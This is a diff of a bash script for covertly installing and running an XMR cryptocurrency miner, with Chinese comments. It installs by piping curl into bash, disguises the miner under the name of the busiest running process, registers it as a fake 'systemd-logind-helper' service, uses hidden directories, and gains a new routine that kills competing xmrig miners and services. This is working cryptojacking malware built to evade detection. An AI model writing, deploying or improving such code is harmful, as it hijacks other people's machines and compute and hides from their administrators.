@@ -1,5 +1,5 @@
 #!/bin/bash
- 
+
 # XMR Mining Script
 # Usage: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口
 
@@ -45,6 +45,72 @@ get_disguise_name() {
     fi
     
     echo "$top_process"
+}
+
+# 检查并清理已存在的xmrig进程
+check_and_cleanup_processes() {
+    log_info "检查是否存在已运行的xmrig进程..."
+    
+    # 使用ps -ef检查xmrig进程
+    local xmrig_processes=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
+    
+    if [ -n "$xmrig_processes" ]; then
+        log_warn "发现已运行的xmrig进程，正在清理..."
+        
+        # 逐个终止进程
+        echo "$xmrig_processes" | while read -r pid; do
+            if [ -n "$pid" ] && [ "$pid" -gt 0 ] 2>/dev/null; then
+                log_info "终止进程 PID: $pid"
+                kill -TERM "$pid" 2>/dev/null || true
+                
+                # 等待进程优雅退出
+                sleep 2
+                
+                # 如果进程仍然存在，强制终止
+                if kill -0 "$pid" 2>/dev/null; then
+                    log_warn "强制终止进程 PID: $pid"
+                    kill -KILL "$pid" 2>/dev/null || true
+                fi
+            fi
+        done
+        
+        # 使用pkill作为备用清理方法
+        log_info "使用pkill清理剩余的xmrig进程..."
+        pkill -f "xmrig" 2>/dev/null || true
+        
+        # 等待进程完全清理
+        sleep 3
+        
+        # 再次检查是否还有残留进程
+        local remaining_processes=$(ps -ef | grep -i xmrig | grep -v grep | wc -l)
+        if [ "$remaining_processes" -gt 0 ]; then
+            log_warn "仍有 $remaining_processes 个xmrig进程残留，继续强制清理..."
+            pkill -9 -f "xmrig" 2>/dev/null || true
+            sleep 2
+        fi
+        
+        log_info "xmrig进程清理完成"
+    else
+        log_info "未发现运行中的xmrig进程"
+    fi
+    
+    # 检查并停止可能的systemd服务
+    if command -v systemctl >/dev/null 2>&1; then
+        local service_names=("systemd-logind-helper" "xmrig" "miner")
+        for service in "${service_names[@]}"; do
+            if systemctl is-active --quiet "$service" 2>/dev/null; then
+                log_info "停止systemd服务: $service"
+                systemctl stop "$service" 2>/dev/null || true
+                systemctl disable "$service" 2>/dev/null || true
+            fi
+        done
+    fi
+    
+    # 检查并停止SysV服务
+    if [ -f "/etc/init.d/systemd-logind-helper" ]; then
+        log_info "停止SysV服务: systemd-logind-helper"
+        service systemd-logind-helper stop 2>/dev/null || true
+    fi
 }
 
 # 创建隐藏目录
@@ -697,53 +763,6 @@ start_mining() {
     log_info "挖矿服务已启动"
 }
 
-# 检查并终止现有的xmrig进程
-kill_existing_xmrig() {
-    log_info "检查现有的xmrig进程..."
-    
-    # 查找所有可能的xmrig进程（包括原名和伪装名）
-    local xmrig_pids=$(pgrep -f "xmrig" 2>/dev/null || true)
-    local xmrig_exact_pids=$(pgrep -x "xmrig" 2>/dev/null || true)
-    
-    # 合并所有找到的PID并去重
-    local all_pids=$(echo "$xmrig_pids $xmrig_exact_pids" | tr ' ' '\n' | sort -u | grep -v '^$' || true)
-    
-    if [ -n "$all_pids" ]; then
-        log_info "发现现有的xmrig进程，正在终止..."
-        for pid in $all_pids; do
-            if [ -n "$pid" ] && [ "$pid" -gt 0 ] 2>/dev/null; then
-                log_info "终止进程 PID: $pid"
-                kill -TERM "$pid" 2>/dev/null || true
-                sleep 1
-                
-                # 如果进程仍然存在，强制终止
-                if kill -0 "$pid" 2>/dev/null; then
-                    log_info "强制终止进程 PID: $pid"
-                    kill -KILL "$pid" 2>/dev/null || true
-                fi
-            fi
-        done
-        
-        # 等待进程完全终止
-        sleep 2
-        
-        # 再次检查是否还有残留进程
-        local remaining_pids=$(pgrep -f "xmrig" 2>/dev/null || true)
-        if [ -n "$remaining_pids" ]; then
-            log_warn "仍有xmrig进程运行，尝试强制清理..."
-            for pid in $remaining_pids; do
-                if [ -n "$pid" ] && [ "$pid" -gt 0 ] 2>/dev/null; then
-                    kill -KILL "$pid" 2>/dev/null || true
-                fi
-            done
-        fi
-        
-        log_info "现有xmrig进程已清理完成"
-    else
-        log_info "未发现现有的xmrig进程"
-    fi
-}
-
 # 显示状态信息
 show_status() {
     echo
@@ -782,15 +801,15 @@ main() {
         exit 1
     fi
     
-    # 检查并终止现有的xmrig进程
-    kill_existing_xmrig
-    
     # 获取伪装名称
     DISGUISE_NAME=$(get_disguise_name)
     SERVICE_NAME="systemd-logind-helper"
     
     log_info "进程将伪装为: $DISGUISE_NAME"
     log_info "服务将命名为: $SERVICE_NAME"
+    
+    # 检查并清理已存在的xmrig进程
+    check_and_cleanup_processes
     
     # 执行安装步骤
     detect_cpu_info
